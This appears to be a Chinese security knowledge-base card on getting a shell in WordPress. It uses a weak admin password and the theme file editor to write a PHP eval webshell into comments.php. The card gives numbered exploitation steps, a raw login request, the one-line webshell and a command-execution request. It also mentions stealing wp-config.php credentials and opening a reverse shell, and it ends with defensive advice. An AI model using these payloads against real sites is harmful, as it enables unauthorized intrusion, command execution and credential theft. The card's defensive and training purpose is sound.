---
id: web-php-wordpress-admin-weak-password-theme-editor-rce
title: WordPress 后台弱口令 + 主题文件编辑器写入 PHP：管理员会话直接改 comments.php getshell
type: scenario
domain: web
path: web/php/rce
technique: wordpress-admin-theme-editor-php-webshell
tags:
- web
- php
- wordpress
- weak-password
- theme-editor
- webshell
- rce
- post-auth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V243
  verified_at: '2026-11-07T13:18:44+08:00'
  notes: 已对照原文与30张图核对：WordPress 6.2.6/twentytwentyone、admin/123456、外观-主题文件编辑器修改 comments.php 写入 <?php @eval($_POST['cmd']);?>、蚁剑连接 wp-content/themes/twentytwentyone/comments.php 与截图一致；6.2.6 仅为目标环境版本，未设置 affected_versions。dup-scan 与 WordPress 插件上传/模板遍历卡为 related，非同一链。未验证点：未复跑；frontmatter 无 sources/source_url。
url: /docs/web/php/rce/web-php-wordpress-admin-weak-password-theme-editor-rce/
draft: false
kb_aliases:
- WordPress 主题编辑器 getshell
- 外观编辑器写马
- comments.php 木马
- WordPress 后台弱口令
- wp-admin theme file editor
---

## 一句话结论

WordPress 后台使用弱口令（如 `admin/123456`）且未关闭主题文件编辑器时，攻击者登录 `wp-admin` 后可在“外观 → 主题文件编辑器”中直接编辑主题内的 PHP 文件（如 `comments.php`），在文件开头插入 `<?php @eval($_POST['cmd']);?>` 并保存；该文件位于 Web 可访问的 `/wp-content/themes/<theme>/` 下，访问即执行，配合蚁剑等工具即可获得 WebShell，进而以 Web 用户权限执行命令、横向移动。

## 原理

- WordPress 管理员默认拥有 `edit_themes`/`edit_plugins` 能力（多站点环境默认关闭），后台“外观 → 主题文件编辑器”会把编辑内容直接写回主题目录下的 PHP 文件，没有服务端语法/内容安全校验。
- 主题文件位于 `/wp-content/themes/<theme>/`，是 Web 根下可被 PHP 解析的路径；修改后的 `comments.php` 在下一次请求时由 PHP 引擎编译执行，因此 `eval($_POST[...])` 立即生效。
- 弱口令是入口：`wpscan` 可枚举 WordPress 版本（本例 6.2.6）与主题（twentytwentyone），`admin/123456` 直接登录；如果站点没有登录失败锁定、验证码或 2FA，爆破/字典即可命中。
- 为什么用主题文件而不是插件：主题编辑器默认存在且不需要上传/安装权限；随便选一个会被访问的模板文件（`comments.php`、`404.php`、`functions.php`）写入即可。`functions.php` 在每次请求都会加载，但改坏会影响全站，`comments.php` 更隐蔽。
- 写入位置：把 Payload 放在文件最前面（`<?php ... ?>` 之前不能有输出），避免主题原有 HTML/PHP 逻辑干扰；保存后直接访问 `http://target/wp-content/themes/<theme>/comments.php`。

## 触发条件

- 目标为 WordPress，`wp-admin` 可访问且管理员账号使用弱口令/已泄露口令。
- 未设置 `DISALLOW_FILE_EDIT`（默认允许后台编辑主题/插件文件），且主题目录对 Web 用户可写。
- Web 服务器按 `.php` 解析主题目录（未被安全策略禁止执行）。
- 攻击者能访问 `wp-content/themes/<theme>/<file>.php`。

## 利用步骤

1. `fscan`/`whatweb` 发现 WordPress；`wpscan --url http://target -e vp,vt,tt` 枚举版本、插件与主题，得到主题名与路径。
2. 使用弱口令登录 `wp-login.php`（如 `admin/123456`），进入 `wp-admin`。
3. 打开“外观 → 主题文件编辑器”，选择当前主题的 `comments.php`（或 `404.php`）。
4. 在文件最前面插入一句话/加密 WebShell，例如 `<?php @eval($_POST['cmd']);?>`，点击“更新文件”。
5. 访问 `http://target/wp-content/themes/<theme>/comments.php`，用蚁剑/冰蝎连接，执行命令。
6. 读取 `wp-config.php` 获取数据库凭据，或直接反弹 Shell 进入内网。

## PoC

登录（弱口令）：

```http
POST /wp-login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

log=admin&pwd=123456&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
```

主题文件写入内容（保存后访问）：

```php
<?php @eval($_POST['cmd']);?>
```

```http
POST /wp-content/themes/twentytwentyone/comments.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

cmd=system('id');
```

原文使用蚁剑连接该 URL，并在目标上取得第一个 flag；随后反弹 Shell 到 VPS 做内网代理。

## 变体与关联

- **编辑位置变体**：`functions.php`（每次请求加载，但易破坏站点）、`404.php`、`header.php`、`footer.php`；也可编辑插件文件。
- **编辑器被禁用时**：若 `DISALLOW_FILE_EDIT` 为 true，管理员仍可上传/安装恶意插件（需 `install_plugins`/`upload_plugins` 权限）或修改主题 ZIP 上传。
- **同类后台编辑器 getshell**：[[web-php-rce-joomla-admin-template-editor-webshell]]（Joomla com_templates）、[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]（DedeCMS 模板标签）等，思路相同但 CMS 与具体编辑接口不同。
- **前置信息收集**：`wpscan` 的版本/主题/插件枚举也可用于发现已知插件漏洞；弱口令登录后可结合数据库导出进一步横向。

## 检测与防御

- 在 `wp-config.php` 中设置 `define('DISALLOW_FILE_EDIT', true);`，禁用后台主题/插件文件编辑。
- 强制管理员使用强口令、启用 2FA、限制 `wp-admin` 访问来源、部署登录失败锁定与验证码。
- 对 `wp-content/themes`、`wp-content/plugins` 做文件完整性监控（哈希基线），发现 PHP 文件新增/修改立即告警；禁用主题目录内的可写权限。
- Web 应用防火墙/EDR 监控 `wp-admin/theme-editor.php` 的保存请求与主题目录中突然出现的 `eval`/`assert`/`system` 等关键字；定期用 Wordfence 等工具扫描。
